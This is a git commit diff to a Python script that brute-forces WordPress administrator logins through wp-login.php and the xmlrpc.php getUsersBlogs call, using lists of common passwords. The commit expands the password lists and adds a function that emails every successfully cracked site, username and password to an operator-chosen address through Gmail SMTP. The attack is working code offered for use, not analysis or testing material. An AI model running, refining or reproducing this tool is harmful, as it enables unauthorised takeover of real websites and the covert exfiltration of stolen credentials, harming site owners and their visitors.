8ef6f986e3d580c81b8d43bade4cc2d7ddcd288c
jd-961 <69595593+jd-961@users.noreply.github.com>
2020-08-18 20:11:09 +0800

    Update wp_bruteforce.py

--- wp_bruteforce.py
+++ wp_bruteforce.py
@@ -1,7 +1,10 @@
 import sys
+import random
 import urllib3
+import smtplib
 import requests
 from multiprocessing import Pool
+from email.mime.text import MIMEText
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
@@ -10,6 +13,18 @@ headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gec
         'Accept-Encoding': 'gzip, deflate',
         'Cookie': 'humans_21909=1'}
 
+
+def send_smtp(data):
+    try:
+        email_sender = ['list of email address']
+        server = smtplib.SMTP('smtp.gmail.com', 587) #change to your mail host server
+        server.starttls()
+        randomize = random.choice(email_sender)
+        server.login(randomize, '#password')
+        server.sendmail(randomize, '#where to receive the emails', data.as_string())
+    except:
+        pass
+    
 
 def brute_force_login(sites, username, cookies):
     
@@ -21,7 +36,7 @@ def brute_force_login(sites, username, cookies):
         'Cookie': f'humans_21909=1; {cookies}'}
 
     try:
-        passwd = ['admin', 'pass', 'admin123', 'admin@123', 'admin1234', 'admin123456', 'admin@1234', '123456', 'password', 'passw0rd', '111111', 'password1', 'qwerty', 'qwerty1234', 'qwerty123456', 'qwertyuiop', 'Admin', 'Admin@1234', 'Admin1234', 'Admin@123']
+        passwd = ['Password', '123456', '123456789', 'password', 'Qwerty', '1111111', '12345678', 'abc123', '1234567', 'password1', 'admin', 'passw0rd', 'master', 'trustno1', 'admin@123', 'Admin@123', 'admin1234', 'Admin@1234', 'p@ssw0rd', 'p@ssword', 'P@ssw0rd', '666666', 'administrator1234', 'Administrator123']
         for z in passwd:
             pass1 = []
             pass1.append(z)
@@ -35,9 +50,12 @@ def brute_force_login(sites, username, cookies):
                 'testcookie': '1'}
 
                 r = requests.post(f'{sites}wp-login.php', headers=headers, timeout=10, data=data, verify=False, allow_redirects=False)
-                print(f'Status Code : {r.status_code} URL: {r.url} - Login INFO : {username}::{passwords}')
+                #print(f'Status Code : {r.status_code} URL: {r.url} - Login INFO : {username}::{passwords}')
                 if f'{username}%' in r.headers['Set-Cookie']:
                     print(f'[Log in Success] >> {sites} - {username}::{passwords}')
+                    data_1 = f'[Log in success] >> {sites} - {username}::{passwords}'
+                    data_output_email = MIMEText(data_1)
+                    send_smtp(data_output_email)
                     with open('wp_crack_login_page.txt', 'a+') as output:
                         output.write(f'[Log in Success] >> {r.url} - {username}::{passwords}\n')
                 else:
@@ -55,7 +73,7 @@ def brute_force_xmlrpc(sites, username, cookies):
         'Cookie': f'humans_21909=1; {cookies}'}
 
     try:
-        passwd = ['admin', 'pass', 'admin123', 'admin@123', 'admin1234', 'admin123456', 'admin@1234', '123456', 'password', 'passw0rd', '111111', 'password1', 'Fucker123!!Dragon123~!', 'qwerty', 'qwerty1234', 'qwerty123456', 'qwertyuiop', 'Admin', 'Admin@1234']
+        passwd = passwd = ['Password', '123456', '123456789', 'password', 'Qwerty', '1111111', '12345678', 'abc123', '1234567', 'password1', 'admin', 'passw0rd', 'master', 'trustno1', 'admin@123', 'Admin@123', 'admin1234', 'Admin@1234', 'p@ssw0rd', 'p@ssword', 'P@ssw0rd', '666666', 'administrator1234', 'Administrator123']
         for z in passwd:
             pass1 = []
             pass1.append(z)
@@ -65,10 +83,13 @@ def brute_force_xmlrpc(sites, username, cookies):
 
                 data = """<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>%s</value></param><param><value>%s</value></param></params></methodCall>""" % (username, passwords)
                 r = requests.post(f'{sites}xmlrpc.php', headers=headers, data=data, timeout=10, verify=False)
-                print(f'Status Code : {r.status_code} URL: {r.url} - Login INFO : {username}::{passwords}')
+                #print(f'Status Code : {r.status_code} URL: {r.url} - Login INFO : {username}::{passwords}')
                 if r.ok:
                     if 'isAdmin' in r.text:
                         print(f'[Log in success] >> {sites} - {username}::{passwords}')
+                        data_1 = f'[Log in success] >> {sites} - {username}::{passwords}'
+                        data_output_email = MIMEText(data_1)
+                        send_smtp(data_output_email)
                         with open('wp_crackxmlrpc.txt', 'a+') as output:
                             output.write(f'[Log in success] >> {sites} - {username}::{passwords}\n')
                 if not r.ok:
